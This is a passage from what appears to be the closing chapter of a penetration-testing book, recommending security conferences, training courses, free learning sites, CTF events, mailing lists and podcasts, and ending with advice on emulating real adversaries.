individuals, get your hands dirty, and learn. Two major websites that have a great list of security conferences are: ● https://secore.info/conferences ● http://infosecevents.net/calendar/ I will give you a small sample of the conferences that I would recommend from personal experience (in no particular order): ● DefCon ( http://www.defcon.org/ ) - This is one of the largest hacker conferences in the world and takes place in Las Vegas, NV. This conference is a must and is relatively affordable. ● DerbyCon ( https://www.derbycon.com/ ) - Another relatively low-cost conference, which takes place in Kentucky. Some of my favorite talks have come from DerbyCon. ● BlackHat ( http://www.blackhat.com/ ) - This conference is also held in Las Vegas, NV and is directed more toward corporate employees. It has great speakers, but is extremely expensive. ● Bsides ( http://www.securitybsides.com/ ) - There are Bsides conferences all over the country and are usually FREE. Find yours! ● ToorCon ( http://toorcon.net/ ) - This is one of the smaller conferences and is held in"},{"pageNumber":384,"pageContent":"San Diego, CA. You will meet a lot of new people here and everyone is pretty friendly. ● CanSec ( http://cansecwest.com/ ) - CanSecWest conference is one of the more technical conferences. Although, extremely pricey, it is best known for its PWN2OWN contest. ● Shmoocon ( http://www.shmoocon.org/ ) - One of the largest conferences on the east coast and usually under $200. This is one of my favorite conferences. ● OWASP AppSec ( https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference ) - Cheap and fun conference focused on web application security. Cost is typically under $100 if you are an OWASP member. ● Lethal ( http://www.meetup.com/LETHAL/ ) - Of course, I have to include my group. Although, it is not a conference, we have monthly meetups and have presenters. Not only is it free, but the group is small, so it is easy for you to get involved and meet others with similar interests. If you are in the LA/Orange County CA area, come by! ● The Ethical Hackers Club (TEHC) - This is one of my old groups in the Maryland area. TEHC is open for anybody with or without experience in network and computer security. They offer an open forum of discussion and informal training on anything network and computer security related. Sign up at www.t-e-h-c.com or http://www.meetup.com/ethical-hacker-club . But don’t forget, sometimes the best conferences are those that are local. They might not have the most famous speakers or most professional setting, but this is where you will find people just like you. I find that the people at the local events are much more open to sharing and working on projects together. Training Courses: If you are looking for a jumpstart into a particular field in security, you would most likely benefit from a training course. Since there are so many different training courses to choose from, here are some recommendations: ● BlackHat - This one is pretty expensive, but it offers a lot of different courses, which are taught by some of the best. ● DerbyCon - Well-priced training in Kentucky and occurs during the conference. ● SANS ( http://www.sans.org ) - Expensive training, but they are the industry standard. ● Offensive Security ( http://www.offensive-security.com/ ) - Well-priced and I highly recommend taking the online Offensive Security courses. You get a lot of great hands- on experience, but will need to invest a lot of time. ● Exodus - ( https://www.exodusintel.com/training.html ) - Excellent training course for advanced vulnerability and exploitation courses. "},{"pageNumber":385,"pageContent":"Free Training: ● Offensive Computer Security FSU: http://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/ ● Pentesterslab: https://pentesterlab.com/exercises/ ● Cybrary: http://www.cybrary.it/ ● Open Security Training: http://opensecuritytraining.info/Training.html ● Coursea: https://www.coursera.org ● EdX: https://www.edx.org/ Capture The Flag (CTF) If you plan to make this your profession or even if you do this for fun, you really need to get involved with different CTF challenges. Try to find a few friends or maybe find your local security group to attempt these challenges. Not only will it test your skill and understanding of attacks, but you will also be able to better connect with other people in the industry. Spending three days and nights doing a challenge is probably one of the most rewarding experiences. Go visit https://ctftime.org and find out where and when the next CTFs are. If you are in the Orange County, CA area, stop by www.meetup.com/lethal and join one of our teams! Keeping Up To Date Here are a list of RSS feeds I monitor on a daily basis. I made it small enough so that I can quickly look through it all in a matter of minutes: ● http://www.securepla.net/rss.php Mailing Lists ● Seclist.org has taken over what used to be Full Disclosure. This is a vendor-neutral forum for detailed discussion of vulnerabilities and exploitation techniques, as well as tools, papers, news, and events of interest to the community. ○ http://seclists.org/fulldisclosure/ ● Dragon News Bytes - Great topics on everything such as privacy, tools, malware, attacks, presentations, and more. ○ https://www.team-cymru.org/News/dnb.html Podcasts "},{"pageNumber":386,"pageContent":"I have actually moved over to listening to podcasts versus just reading RSS feeds. Are you looking for bleeding-edge security issues being discussed by some of the best? Take a spin through some of these: ● Brakeing Down Security - http://brakeingsecurity.blogspot.com/ ● Risky Business - http://risky.biz/netcasts/risky-business ● Security Now - https://www.grc.com/securitynow.htm ● Security Weekly - https://securityweekly.com/podcasts/ ● The Social-Engineer Podcast - http://www.social-engineer.org/category/podcast/ ● Hak5 - https://itunes.apple.com/us/podcast/hak5-quicktime-large/id117137282? mt=2 ● SecuraBit - https://itunes.apple.com/us/podcast/securabit/id280048405 Learning From The Bad Guys When I teach my penetration testers, one of the most important things I tell them is to watch what the bad guys do. Not only does it help extend the attack process, but it also helps with lateral movement and learning what works in the real world. One of the main reasons my clients hire me is to emulate what the bad guys might do. If you are using theoretical attacks, this might not be as beneficial as using the tactics that their adversaries might try to do. Also, make sure you learn about your client’s industry. If their attacks use PDFs versus credential compromise, you might want to focus your attacks on those types. The more you can emulate their patterns, the better the company can protect themselves against their most immediate threats.

It is time to take everything you learned and build on top of that. I have already recommended that you get involved with your local security groups and/or participate in security conferences. You can also start a blog and start playing with these different tools. Find out what works and what doesn’t and see how you can attack more efficiently and be silent on the network. It will take some time outside your normal 9-to-5 job, but it will definitely be worth it. I hope you have found the content in this book to be something of value and picked up some tips and tricks. I wrote this second book mainly because security is always changing and it is really important to stay on top of your game. As I have emphasized throughout this book and the prior one, there isn’t a point when you can say you have mastered security. However, once you have the basics down pat, the high-level attacks don’t really change. We see time and time again that old attacks come back and that you always need to be ready.

It will help me to continue developing better content and see what topics you would like to hear more about .
